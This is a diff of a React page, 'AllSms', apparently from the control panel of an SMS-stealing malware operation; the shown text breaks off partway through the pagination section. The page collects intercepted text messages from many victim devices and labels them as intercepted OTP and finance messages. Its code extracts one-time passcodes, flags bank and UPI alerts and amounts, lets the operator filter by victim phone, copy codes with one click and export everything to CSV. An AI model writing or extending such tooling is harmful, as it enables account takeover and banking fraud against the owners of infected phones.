@@ -1,4 +1,4 @@
-import { useEffect, useState, useMemo, useRef } from "react";
+import { useEffect, useState, useMemo } from "react";
 import { Layout } from "@/components/layout";
 import { useToast } from "@/hooks/use-toast";
 import {
@@ -6,19 +6,16 @@ import {
   Search,
   Copy,
   ChevronDown,
-  ChevronUp,
-  IndianRupee,
   ArrowDownWideNarrow,
   Smartphone,
-  ShieldCheck,
   Phone,
   KeyRound,
-  Filter,
   CheckCircle2,
-  ExternalLink,
   Download,
-  Send,
   X,
+  Send,
+  Radio,
+  RefreshCw,
 } from "lucide-react";
 import {
   classifySms,
@@ -63,13 +60,11 @@ const ALL_CATS: SmsCategory[] = [
 
 type SortMode = "newest" | "oldest" | "sender" | "device";
 
-// Extract standalone OTP code if message contains OTP keywords
 function extractOtp(body: string): string | null {
   const isOtpMsg =
     /otp|code|verification|one time|v-code|pin\b|passcode|secret/i.test(body);
   if (!isOtpMsg) return null;
 
-  // Patterns like "OTP is 123456", "code: 1234", "123456 is your secret OTP"
   const m1 = body.match(
     /(?:otp|code|pin|passcode|verification\s*code)[^\d\n\r]{1,15}(\d{4,8})\b/i
   );
@@ -78,128 +73,112 @@ function extractOtp(body: string): string | null {
   const m2 = body.match(/\b(\d{4,8})\s+is\s+(?:your\s+)?(?:otp|code|pin)/i);
   if (m2) return m2[1];
 
-  // Fallback: any standalone 4-8 digit number in OTP message
-  const m3 = body.match(/\b\d{4,8}\b/);
-  return m3 ? m3[0] : null;
+  const m3 = body.match(/\b(\d{4,8})\b/);
+  return m3 ? m3[1] : null;
 }
 
-// Highlight matched amount and numbers
-function highlightBody(body: string) {
-  const esc = body
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
-  return esc.replace(
-    /(?:rs\.?|inr|₹)\s?([\d,]+(?:\.\d{1,2})?)|([\d,]+(?:\.\d{1,2})?)\s?(?:rs\.?|inr|₹)/gi,
-    '<mark class="bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 font-bold rounded px-1">$&</mark>'
-  );
-}
+const ITEMS_PER_PAGE = 30;
 
 export function AllSms() {
   const { toast } = useToast();
   const [allSms, setAllSms] = useState<SmsEntry[]>([]);
-  const [catFilter, setCatFilter] = useState<SmsCategory | "all" | "finance-only" | "otp-only">("all");
+  const [loading, setLoading] = useState(true);
+  const [catFilter, setCatFilter] = useState<string>("all");
   const [selectedDevice, setSelectedDevice] = useState<string>("all");
-  const [sortMode, setSortMode] = useState<SortMode>("newest");
   const [search, setSearch] = useState("");
-  const [expandedKeys, setExpandedKeys] = useState<Set<string>>(new Set());
+  const [sortMode, setSortMode] = useState<SortMode>("newest");
   const [currentPage, setCurrentPage] = useState(1);
-  const ITEMS_PER_PAGE = 40;
   const [copiedKey, setCopiedKey] = useState<string | null>(null);
 
-  // Check URL query parameters for ?device=...
-  useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
-    const devParam = params.get("device");
-    if (devParam) {
-      setSelectedDevice(devParam);
-    }
-  }, []);
-
-  function scrapeNumbers(body: string, phone: string): string[] {
-    const out = new Set<string>();
-    for (const m of body.match(/\b[6-9]\d{9}\b/g) || []) out.add(m);
-    const norm = phone.replace(/[^\d]/g, "").slice(-10);
-    if (/^[6-9]\d{9}$/.test(norm)) out.add(norm);
-    return [...out];
-  }
-
-  // Aggregated SMS served across all instances
-  const { data: smsData, loading } = usePolling(getSms, 4000);
+  const { data: smsData, isSyncing, refetch } = usePolling(getSms, 4000);
 
   useEffect(() => {
-    if (!smsData?.sms) return;
-    const entries: SmsEntry[] = smsData.sms.map((sms: SmsRow) => {
-      const cls = classifySms(sms.body);
-      return {
-        deviceId: sms.deviceId,
-        deviceModel: sms.deviceModel || "Unknown",
-        devicePhone: sms.devicePhone || "",
-        pushKey: sms.pushKey,
-        from: sms.from || "UNKNOWN",
-        body: sms.body || "",
-        date: sms.date || Date.now(),
-        category: cls.category,
-        isFinance: cls.isFinance,
-        amount: cls.amount,
-        otpCode: extractOtp(sms.body || ""),
-        info: extractInfo(sms.body || ""),
-        dbLabel: sms.dbLabel || "main",
-        numbers: scrapeNumbers(sms.body || "", sms.devicePhone || ""),
-      };
+    if (!smsData) return;
+
+    const parsed: SmsEntry[] = [];
+    smsData.forEach((row: SmsRow) => {
+      let d = 0;
+      if (typeof row.date === "number") d = row.date;
+      else if (typeof row.date === "string") {
+        d = isNaN(Number(row.date)) ? new Date(row.date).getTime() || 0 : Number(row.date);
+      }
+      if (d > 0 && d < 1e12) d *= 1000;
+
+      const cat = classifySms(row.from, row.body);
+      const info = extractInfo(row.body);
+      const otp = extractOtp(row.body);
+      const isFin = cat === "BANK" || cat === "UPI" || cat === "INVESTMENT" || !!info.amount;
+
+      parsed.push({
+        deviceId: row.deviceId,
+        deviceModel: row.model || "Unknown Device",
+        devicePhone: row.phone || "",
+        pushKey: row.id,
+        from: row.from || "UNKNOWN",
+        body: row.body || "",
+        date: d,
+        category: cat,
+        isFinance: isFin,
+        amount: info.amount,
+        otpCode: otp,
+        info,
+        dbLabel: row.dbLabel || "",
+        numbers: info.numbers,
+      });
     });
-    entries.sort((a, b) => b.date - a.date);
-    setAllSms(entries);
+
+    setAllSms(parsed);
+    setLoading(false);
   }, [smsData]);
 
-  // Unique devices for the filter dropdown
   const uniqueDevices = useMemo(() => {
-    const map = new Map<string, { id: string; label: string; count: number }>();
-    for (const s of allSms) {
+    const map = new Map<string, { label: string; count: number }>();
+    allSms.forEach((s) => {
       const existing = map.get(s.deviceId);
       if (existing) {
-        existing.count++;
+        existing.count += 1;
       } else {
         map.set(s.deviceId, {
-          id: s.deviceId,
-          label: `${s.deviceModel} (${s.devicePhone || s.deviceId.slice(0, 6)})`,
+          label: s.devicePhone ? `${s.deviceModel} (${s.devicePhone})` : s.deviceModel,
           count: 1,
         });
       }
-    }
-    return Array.from(map.values()).sort((a, b) => b.count - a.count);
+    });
+    return Array.from(map.entries()).map(([id, val]) => ({
+      id,
+      label: val.label,
+      count: val.count,
+    }));
   }, [allSms]);
 
   const catCounts = useMemo(() => {
-    const counts: Record<string, number> = {
-      all: allSms.length,
-      finance: allSms.filter((s) => s.isFinance).length,
-      otp: allSms.filter((s) => Boolean(s.otpCode) || s.category === "OTP").length,
-    };
-    for (const c of ALL_CATS) counts[c] = 0;
-    for (const s of allSms) counts[s.category] = (counts[s.category] || 0) + 1;
-    return counts;
+    const c: Record<string, number> = { all: allSms.length, finance: 0, otp: 0 };
+    ALL_CATS.forEach((cat) => (c[cat] = 0));
+    allSms.forEach((s) => {
+      if (c[s.category] !== undefined) c[s.category]++;
+      if (s.isFinance) c.finance++;
+      if (s.otpCode) c.otp++;
+    });
+    return c;
   }, [allSms]);
 
-  // Filtered & sorted message list
   const displayed = useMemo(() => {
     let list = allSms;
 
-    // Device filter
     if (selectedDevice !== "all") {
       list = list.filter((s) => s.deviceId === selectedDevice);
     }
 
-    // Category / Quick preset filter
-    if (catFilter === "finance-only") {
-      list = list.filter((s) => s.isFinance || s.category === "BANK" || s.category === "UPI");
-    } else if (catFilter === "otp-only") {
-      list = list.filter((s) => Boolean(s.otpCode) || s.category === "OTP");
-    } else if (catFilter !== "all") {
-      list = list.filter((s) => s.category === catFilter);
+    if (catFilter !== "all") {
+      if (catFilter === "finance-only") {
+        list = list.filter((s) => s.isFinance);
+      } else if (catFilter === "otp-only") {
+        list = list.filter((s) => !!s.otpCode);
+      } else {
+        list = list.filter((s) => s.category === catFilter);
+      }
     }
 
-    // Search filter
     if (search) {
       const q = search.toLowerCase();
       list = list.filter(
@@ -213,7 +192,6 @@ export function AllSms() {
       );
     }
 
-    // Sorting
     switch (sortMode) {
       case "newest":
         list = [...list].sort((a, b) => b.date - a.date);
@@ -225,9 +203,7 @@ export function AllSms() {
         list = [...list].sort((a, b) => a.from.localeCompare(b.from));
         break;
       case "device":
-        list = [...list].sort((a, b) =>
-          a.deviceModel.localeCompare(b.deviceModel)
-        );
+        list = [...list].sort((a, b) => a.deviceModel.localeCompare(b.deviceModel));
         break;
     }
     return list;
@@ -243,104 +219,110 @@ export function AllSms() {
     setCurrentPage(1);
   }, [catFilter, selectedDevice, search, sortMode]);
 
-  const toggleExpand = (key: string) => {
-    setExpandedKeys((prev) => {
-      const n = new Set(prev);
-      n.has(key) ? n.delete(key) : n.add(key);
-      return n;
-    });
-  };
-
-  const copyText = (text: string, key: string, label: string = "Copied") => {
+  const copyText = (text: string, key: string, label: string = "COPIED") => {
     navigator.clipboard.writeText(text);
     setCopiedKey(key);
     toast({ title: label, description: text.slice(0, 40) });
     setTimeout(() => setCopiedKey(null), 1600);
   };
 
-  /* Exporters */
-  const download = (filename: string, content: string, mime: string) => {
-    const blob = new Blob([content], { type: mime });
+  const exportSmsCsv = () => {
+    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
+    const header = ["Date", "From", "Category", "Amount", "OTP", "Device", "Body"];
+    const rows = displayed.map((s) => [
+      new Date(s.date).toISOString(),
+      s.from,
+      s.category,
+      s.amount ?? "",
+      s.otpCode ?? "",
+      s.deviceModel,
+      s.body,
+    ].map(esc).join(","));
+
+    const csvContent = [header.join(","), ...rows].join("\n");
+    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8" });
     const url = URL.createObjectURL(blob);
     const a = document.createElement("a");
     a.href = url;
-    a.download = filename;
+    a.download = `sms-hub-${catFilter}-${Date.now()}.csv`;
     a.click();
     URL.revokeObjectURL(url);
   };
 
-  const exportSmsCsv = () => {
-    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
-    const header = ["date", "from", "category", "amount", "otp", "device", "body"];
-    const rows = displayed.map((s) =>
-      [
-        new Date(s.date).toISOString(),
-        s.from,
-        s.category,
-        s.amount ?? "",
-        s.otpCode ?? "",
-        s.deviceModel,
-        s.body,
-      ]
-        .map(esc)
-        .join(",")
-    );
-    download(
-      `sms-${catFilter}.csv`,
-      [header.join(","), ...rows].join("\n"),
-      "text/csv;charset=utf-8"
-    );
-  };
-
   return (
     <Layout>
-      {/* ── Header ── */}
-      <div className="space-y-4 mb-5">
-        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-card-border">
+      <div className="space-y-5">
+        {/* Header Row */}
+        <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 pb-2 border-b border-border">
           <div>
-            <div className="flex items-center gap-2 mb-1">
-              <span className="p-1.5 rounded-lg bg-primary/10 text-primary">
-                <MessageSquare className="w-5 h-5" />
-              </span>
-              <h1 className="text-xl sm:text-2xl font-bold font-display tracking-tight text-foreground">
-                Fleet Messages & SMS Interceptor
-              </h1>
+            <div className="meta text-[10px] text-primary font-bold mb-1">
+              INTERCEPTOR_STREAM / INBOX
             </div>
-            <p className="text-xs sm:text-sm text-muted-foreground flex items-center gap-2 flex-wrap">
-              <span>{allSms.length} messages intercepted</span>
-              <span>·</span>
-              <span className="text-emerald-500 font-medium">₹ {catCounts.finance} financial</span>
-              <span>·</span>
-              <span className="text-primary font-medium">⚡ {catCounts.otp} OTP codes</span>
+            <h2 className="font-display text-3xl sm:text-4xl text-foreground font-bold tracking-tight">
+              SMS_Hub
+            </h2>
+            <p className="text-xs font-mono text-muted-foreground mt-1">
+              TELEMETRY LOGS OF INTERCEPTED INCOMING AND OTP VERIFICATION MESSAGES
             </p>
           </div>
 
           <div className="flex items-center gap-2">
             <button
-              onClick={exportSmsCsv}
-              className="inline-flex items-center gap-1.5 px-3 h-9 rounded-xl border border-card-border bg-card text-xs font-semibold text-muted-foreground hover:text-foreground hover:border-primary transition-all"
+              onClick={() => refetch()}
+              disabled={isSyncing}
+              className="action-btn"
+              title="Refresh SMS stream"
             >
-              <Download className="w-3.5 h-3.5" /> Export CSV
+              <RefreshCw className={`w-3 h-3 ${isSyncing ? "animate-spin text-[#00FFCC]" : ""}`} />
+              <span className="hidden sm:inline">{isSyncing ? "SYNCING..." : "RELOAD"}</span>
+            </button>
+            <button
+              onClick={exportSmsCsv}
+              className="action-btn"
+              title="Export Filtered SMS to CSV"
+            >
+              <Download className="w-3.5 h-3.5" />
+              EXPORT_CSV
             </button>
           </div>
         </div>
 
-        {/* ── Filters & Controls Bar ── */}
+        {/* Stats bar */}
+        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">CAPTURED_SMS</h4>
+            <div className="val text-foreground truncate">{allSms.length}</div>
+          </div>
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">FINANCE_ALERTS</h4>
+            <div className="val text-[#FFB800] truncate">{catCounts.finance}</div>
+          </div>
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">OTP_CODES</h4>
+            <div className="val text-[#00FFCC] truncate">{catCounts.otp}</div>
+          </div>
+          <div className="fleet-stat-card min-w-0">
+            <h4 className="truncate">UNIQUE_SENDERS</h4>
+            <div className="val text-primary truncate">{uniqueDevices.length}</div>
+          </div>
+        </div>
+
+        {/* Filter & Search Bar */}
         <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
           {/* Search input */}
           <div className="relative">
-            <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
             <input
               type="text"
-              placeholder="Search SMS, sender, code, amount..."
+              placeholder="SEARCH_BY_BODY_SENDER_OR_OTP..."
               value={search}
               onChange={(e) => setSearch(e.target.value)}
-              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-8 py-2 text-xs sm:text-sm focus:outline-none focus:ring-2 focus:ring-primary/40"
+              className="w-full bg-card/40 border border-border rounded px-3 py-2 pl-8 pr-8 text-xs font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary transition-all"
             />
             {search && (
               <button
                 onClick={() => setSearch("")}
-                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground p-1"
+                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
               >
                 <X className="w-3.5 h-3.5" />
               </button>
@@ -349,281 +331,209 @@ export function AllSms() {
 
           {/* Device Selector */}
           <div className="relative">
-            <Smartphone className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+            <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
             <select
               value={selectedDevice}
               onChange={(e) => setSelectedDevice(e.target.value)}
-              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-8 py-2 text-xs sm:text-sm font-medium appearance-none focus:outline-none focus:ring-2 focus:ring-primary/40 text-foreground"
+              className="w-full bg-card/60 border border-border rounded px-3 py-2 pl-8 pr-8 text-xs font-mono text-foreground appearance-none focus:outline-none focus:border-primary"
             >
-              <option value="all">All Devices ({uniqueDevices.length})</option>
+              <option value="all">DEVICE: ALL ({uniqueDevices.length})</option>
               {uniqueDevices.map((d) => (
                 <option key={d.id} value={d.id}>
                   {d.label} — {d.count} SMS
                 </option>
               ))}
             </select>
-            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground pointer-events-none" />
           </div>
 
           {/* Sort selector */}
           <div className="relative sm:col-span-2 lg:col-span-1">
-            <ArrowDownWideNarrow className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+            <ArrowDownWideNarrow className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
             <select
               value={sortMode}
               onChange={(e) => setSortMode(e.target.value as SortMode)}
-              className="w-full bg-card border border-card-border rounded-xl pl-10 pr-8 py-2 text-xs sm:text-sm font-medium appearance-none focus:outline-none focus:ring-2 focus:ring-primary/40 text-foreground"
+              className="w-full bg-card/60 border border-border rounded px-3 py-2 pl-8 pr-8 text-xs font-mono text-foreground appearance-none focus:outline-none focus:border-primary"
             >
-              <option value="newest">Sort: Newest First</option>
-              <option value="oldest">Sort: Oldest First</option>
-              <option value="sender">Sort: Sender A–Z</option>
-              <option value="device">Sort: Device A–Z</option>
+              <option value="newest">SORT: NEWEST FIRST</option>
+              <option value="oldest">SORT: OLDEST FIRST</option>
+              <option value="sender">SORT: SENDER A-Z</option>
+              <option value="device">SORT: DEVICE A-Z</option>
             </select>
-            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground pointer-events-none" />
           </div>
         </div>
 
-        {/* ── Category & Preset Quick Chips ── */}
-        <div className="flex items-center gap-1.5 overflow-x-auto pb-1 hide-scrollbar">
-          {/* Preset: All */}
+        {/* Filter Quick Pills */}
+        <div className="flex items-center gap-1.5 overflow-x-auto hide-scrollbar pb-1">
           <button
             onClick={() => setCatFilter("all")}
-            className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold border transition-all ${
+            className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all ${
               catFilter === "all"
-                ? "bg-primary text-primary-foreground border-primary"
-                : "bg-card border-card-border text-muted-foreground hover:text-foreground"
+                ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
+                : "border-border bg-card/40 text-muted-foreground hover:text-foreground hover:border-border/80"
             }`}
           >
-            All Messages ({catCounts.all})
+            ALL ({catCounts.all})
           </button>
 
-          {/* Preset: OTP Only */}
           <button
             onClick={() => setCatFilter(catFilter === "otp-only" ? "all" : "otp-only")}
-            className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold border transition-all flex items-center gap-1.5 ${
+            className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all flex items-center gap-1.5 ${
               catFilter === "otp-only"
-                ? "bg-primary text-primary-foreground border-primary"
-                : "bg-card border-card-border text-primary hover:bg-primary/5"
+                ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
+                : "border-border bg-card/40 text-[#00FFCC] hover:border-[#00FFCC]/40"
             }`}
           >
-            <KeyRound className="w-3.5 h-3.5" />
-            ⚡ OTPs & Codes ({catCounts.otp})
+            <KeyRound className="w-3 h-3" />
+            OTPS & CODES ({catCounts.otp})
           </button>
 
-          {/* Preset: Bank & Finance */}
           <button
             onClick={() => setCatFilter(catFilter === "finance-only" ? "all" : "finance-only")}
-            className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-semibold border transition-all flex items-center gap-1.5 ${
+            className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all flex items-center gap-1.5 ${
               catFilter === "finance-only"
-                ? "bg-emerald-600 text-white border-emerald-600"
-                : "bg-card border-card-border text-emerald-600 dark:text-emerald-400 hover:bg-emerald-500/10"
+                ? "bg-[#FFB800] text-black border-[#FFB800] font-bold"
+                : "border-border bg-card/40 text-[#FFB800] hover:border-[#FFB800]/40"
             }`}
           >
-            <IndianRupee className="w-3 h-3" />
-            🏦 Bank & Finance ({catCounts.finance})
+            BANK & FINANCE ({catCounts.finance})
           </button>
 
-          {/* Individual Categories */}
-          {ALL_CATS.map((c) => (
+          {ALL_CATS.map((cat) => (
             <button
-              key={c}
-              onClick={() => setCatFilter(catFilter === c ? "all" : c)}
-              className={`shrink-0 px-3 py-1.5 rounded-xl text-xs font-medium border transition-all flex items-center gap-1.5 ${
-                catFilter === c
+              key={cat}
+              onClick={() => setCatFilter(catFilter === cat ? "all" : cat)}
+              className={`shrink-0 px-2.5 py-1 rounded text-[10px] font-mono font-semibold border transition-all ${
+                catFilter === cat
                   ? "bg-primary text-primary-foreground border-primary"
-                  : "bg-card border-card-border text-muted-foreground hover:text-foreground"
+                  : "border-border bg-card/40 text-muted-foreground hover:text-foreground"
               }`}
             >
-              <span>{CATEGORY_META[c].emoji}</span>
-              <span>{CATEGORY_META[c].label}</span>
-              <span className="text-[10px] opacity-70">({catCounts[c] || 0})</span>
+              {cat} ({catCounts[cat] || 0})
             </button>
           ))}
         </div>
-      </div>
 
-      {/* ── Message List ── */}
-      {loading ? (
-        <div className="space-y-3">
-          {[1, 2, 3, 4].map((i) => (
-            <div key={i} className="rounded-2xl border border-card-border bg-card p-4 h-28 animate-pulse" />
-          ))}
-        </div>
-      ) : paginatedDisplayed.length === 0 ? (
-        <div className="glass-card p-12 text-center text-muted-foreground max-w-md mx-auto rounded-2xl">
-          <MessageSquare className="w-12 h-12 mx-auto mb-3 opacity-30 text-primary" />
-          <h3 className="font-bold text-base text-foreground mb-1">No Matching Messages</h3>
-          <p className="text-xs text-muted-foreground">
-            No SMS messages match your current filter or search criteria.
-          </p>
-        </div>
-      ) : (
-        <div className="space-y-3">
-          {paginatedDisplayed.map((sms) => {
-            const key = `${sms.deviceId}:${sms.pushKey}`;
-            const expanded = expandedKeys.has(key);
-            const needsExpand = sms.body.length > 180;
-            const preview = sms.body.slice(0, 180) + "…";
-            const meta = CATEGORY_META[sms.category];
-
-            return (
-              <div
-                key={key}
-                className="rounded-2xl border border-card-border bg-card p-4 sm:p-5 transition-all hover:border-primary/40 shadow-xs"
-              >
-                {/* Top Row: Sender + Category + Date */}
-                <div className="flex items-center justify-between gap-2 mb-2">
-                  <div className="flex items-center gap-2 flex-wrap min-w-0">
-                    <span className="font-bold text-sm text-foreground truncate select-all">
-                      {sms.from}
-                    </span>
-                    <span
-                      className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-md text-[10px] font-bold uppercase tracking-wide ${
-                        sms.isFinance
-                          ? "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400"
-                          : "bg-muted text-muted-foreground"
-                      }`}
-                    >
-                      {meta.emoji} {meta.label}
-                    </span>
-                    {sms.amount && (
-                      <span className="inline-flex items-center gap-0.5 px-2 py-0.5 rounded-md bg-emerald-500/20 text-emerald-600 dark:text-emerald-400 text-xs font-bold font-mono">
-                        <IndianRupee className="w-3 h-3" /> {sms.amount}
+        {/* ── Messages Feed ── */}
+        {loading ? (
+          <div className="space-y-2">
+            {[1, 2, 3, 4, 5].map((i) => (
+              <div key={i} className="h-24 rounded bg-card/40 border border-border animate-pulse" />
+            ))}
+          </div>
+        ) : paginatedDisplayed.length === 0 ? (
+          <div className="p-12 text-center border border-dashed border-border rounded bg-card/20 animate-in fade-in duration-300">
+            <MessageSquare className="w-10 h-10 mx-auto mb-2 opacity-30 text-primary" />
+            <p className="font-mono text-sm font-semibold text-foreground">
+              NO_MESSAGES_MATCHING_FILTER
+            </p>
+            <p className="meta text-[10px] mt-1 text-muted-foreground">
+              TRY ADJUSTING CATEGORY FILTERS OR SEARCH KEYWORD
+            </p>
+          </div>
+        ) : (
+          <div key={`${catFilter}-${selectedDevice}-${sortMode}`} className="space-y-2.5 animate-in slide-in-from-left-4 fade-in duration-300">
+            {paginatedDisplayed.map((msg, idx) => {
+              const msgKey = `sms-${msg.pushKey || idx}-${msg.deviceId}`;
+              return (
+                <div
+                  key={msgKey}
+                  className="stat-card p-3.5 hover:border-primary/50 transition-all flex flex-col gap-2"
+                >
+                  {/* Top Bar: Sender, Category Tag, Device Link, Time */}
+                  <div className="flex items-center justify-between gap-2 flex-wrap text-xs">
+                    <div className="flex items-center gap-2">
+                      <span className="tag font-bold">{msg.from}</span>
+                      <span className="meta text-[10px] text-muted-foreground">
+                        [{msg.category}]
                       </span>
-                    )}
-                  </div>
-                  <span className="text-[11px] font-mono text-muted-foreground shrink-0">
-                    {formatSmsDate(sms.date)}
-                  </span>
-                </div>
-
-                {/* OTP Quick-Action Banner (If detected) */}
-                {sms.otpCode && (
-                  <div className="mb-3 p-2.5 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-between gap-2">
-                    <div className="flex items-center gap-2 min-w-0">
-                      <span className="p-1 rounded bg-primary text-primary-foreground">
-                        <KeyRound className="w-3.5 h-3.5" />
-                      </span>
-                      <div className="min-w-0">
-                        <span className="text-[10px] uppercase font-bold text-muted-foreground tracking-wider block">
-                          One-Time Password
+                      {msg.isFinance && (
+                        <span className="rupee-alert text-[10px] font-bold">
+                          FINANCIAL_ALERT
                         </span>
-                        <span className="font-mono text-base font-black text-primary tracking-widest">
-                          {sms.otpCode}
-                        </span>
-                      </div>
+                      )}
                     </div>
-                    <button
-                      onClick={() => copyText(sms.otpCode!, key + "-otp", "OTP Copied")}
-                      className="px-3 h-8 rounded-lg bg-primary text-primary-foreground text-xs font-bold hover:bg-primary/90 transition-all shrink-0 flex items-center gap-1"
-                    >
-                      {copiedKey === key + "-otp" ? (
-                        <>
-                          <CheckCircle2 className="w-3.5 h-3.5" /> Copied
-                        </>
-                      ) : (
-                        <>
-                          <Copy className="w-3.5 h-3.5" /> Copy Code
-                        </>
-                      )}
-                    </button>
-                  </div>
-                )}
 
-                {/* Message Body */}
-                <div className="text-xs sm:text-sm text-foreground/90 leading-relaxed break-words font-normal mb-3">
-                  {expanded || !needsExpand ? (
-                    <span
-                      dangerouslySetInnerHTML={{
-                        __html: highlightBody(sms.body),
-                      }}
-                    />
-                  ) : (
-                    <span>{preview}</span>
-                  )}
-                  {needsExpand && (
-                    <button
-                      onClick={() => toggleExpand(key)}
-                      className="ml-1 text-primary font-semibold hover:underline inline-flex items-center text-xs"
-                    >
-                      {expanded ? "Show Less" : "Read More"}
-                    </button>
-                  )}
-                </div>
-
-                {/* Bottom Footer: Device info, Bank pill, Actions */}
-                <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-card-border/60 text-xs">
-                  <div className="flex items-center gap-2 flex-wrap text-muted-foreground text-[11px]">
-                    <Link
-                      href={`/device/${sms.deviceId}`}
-                      className="inline-flex items-center gap-1 font-medium hover:text-primary transition-colors"
-                    >
-                      <Smartphone className="w-3 h-3" />
-                      {sms.deviceModel} ({sms.devicePhone || sms.deviceId.slice(0, 6)})
-                    </Link>
-                    {sms.info.bank && (
-                      <span className="px-1.5 py-0.5 rounded bg-muted text-[10px] font-semibold">
-                        🏦 {sms.info.bank}
+                    <div className="flex items-center gap-3">
+                      <Link
+                        href={`/device/${msg.deviceId}`}
+                        className="meta text-[10px] text-primary hover:underline flex items-center gap-1"
+                      >
+                        <Smartphone className="w-3 h-3" />
+                        <span>{msg.deviceModel}</span>
+                      </Link>
+                      <span className="meta text-[10px] text-muted-foreground">
+                        {formatSmsDate(msg.date)}
                       </span>
-                    )}
-                    {sms.info.cardLast4 && (
-                      <span className="font-mono text-[10px]">
-                        💳 •••• {sms.info.cardLast4}
-                      </span>
-                    )}
+                    </div>
                   </div>
 
-                  <div className="flex items-center gap-1.5">
-                    <button
-                      onClick={() => copyText(sms.body, key + "-body", "SMS Text Copied")}
-                      className="px-2.5 py-1 rounded-lg border border-card-border hover:bg-muted text-[11px] font-semibold text-muted-foreground hover:text-foreground transition-all flex items-center gap-1"
-                    >
-                      {copiedKey === key + "-body" ? (
-                        <>
-                          <CheckCircle2 className="w-3 h-3 text-emerald-500" /> Copied
-                        </>
-                      ) : (
-                        <>
-                          <Copy className="w-3 h-3" /> Copy SMS
-                        </>
+                  {/* Body Text */}
+                  <div className="p-2.5 rounded bg-background/60 border border-border font-mono text-xs text-foreground leading-relaxed break-words select-text">
+                    {msg.body}
+                  </div>
+
+                  {/* Bottom Meta & Quick Copy (Enhanced for Mobile) */}
+                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pt-1 border-t border-border/40 mt-1">
+                    <div className="flex items-center gap-2 flex-wrap">
+                      {msg.amount && (
+                        <span className="rupee-alert text-[11px] font-bold py-1.5 px-2">
+                          ₹ {msg.amount}
+                        </span>
                       )}
-                    </button>
-                    <Link
-                      href={`/device/${sms.deviceId}`}
-                      className="p-1 rounded-lg hover:bg-muted text-muted-foreground hover:text-primary"
-                      title="Open device"
-                    >
-                      <ExternalLink className="w-3.5 h-3.5" />
-                    </Link>
+                    </div>
+
+                    <div className="flex items-center gap-2 w-full sm:w-auto">
+                      {msg.otpCode && (
+                        <button
+                          onClick={() => copyText(msg.otpCode!, `otp-${idx}`, "OTP COPIED")}
+                          className="flex-1 sm:flex-none action-btn min-h-[40px] sm:min-h-[auto] text-[11px] py-1.5 px-3 text-black bg-[#00FFCC] border-[#00FFCC] hover:bg-[#00FFCC]/90"
+                        >
+                          <KeyRound className="w-3.5 h-3.5" />
+                          COPY OTP: {msg.otpCode}
+                        </button>
+                      )}
+                      <button
+                        onClick={() => copyText(msg.body, `body-${idx}`, "BODY COPIED")}
+                        className="flex-1 sm:flex-none action-btn min-h-[40px] sm:min-h-[auto] text-[11px] py-1.5 px-3"
+                      >
+                        <Copy className="w-3.5 h-3.5" />
+                        {copiedKey === `body-${idx}` ? "COPIED" : "COPY BODY"}
+                      </button>
+                    </div>
                   </div>
                 </div>
-              </div>
-            );
-          })}
-        </div>
-      )}
+              );
+            })}
+          </div>
+        )}
 
-      {/* ── Pagination ── */}
-      {totalPages > 1 && (
-        <div className="flex items-center justify-center gap-2 mt-6">
-          <button
-            disabled={currentPage <= 1}
-            onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
-            className="px-3 py-1.5 rounded-xl border border-card-border bg-card text-xs font-semibold disabled:opacity-40"
-          >
-            Previous
-          </button>
-          <span className="text-xs text-muted-foreground font-mono px-2">
-            Page {currentPage} of {totalPages}
-          </span>
-          <button
-            disabled={currentPage >= totalPages}
-            onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
